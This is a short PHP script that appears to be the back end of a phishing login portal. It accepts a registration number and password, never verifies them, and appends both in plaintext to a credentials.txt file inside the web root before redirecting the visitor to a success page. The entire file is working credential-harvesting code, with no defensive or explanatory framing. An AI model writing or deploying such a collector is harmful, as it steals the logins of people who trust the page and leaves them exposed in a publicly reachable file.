<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $registration_number = isset($_POST['registration_number']) ? $_POST['registration_number'] : '';
    $password = isset($_POST['password']) ? $_POST['password'] : '';
    if ($registration_number && $password) {
        $log = "Registration Number: $registration_number, Password: $password\n";
        file_put_contents('/var/www/html/portal/credentials.txt', $log, FILE_APPEND);
        header('Location: /portal/success.html');
        exit();
    } else {
        header('Location: /portal/index.html');
        exit();
    }
} else {
    header('Location: /portal/index.html');
    exit();
}
?>
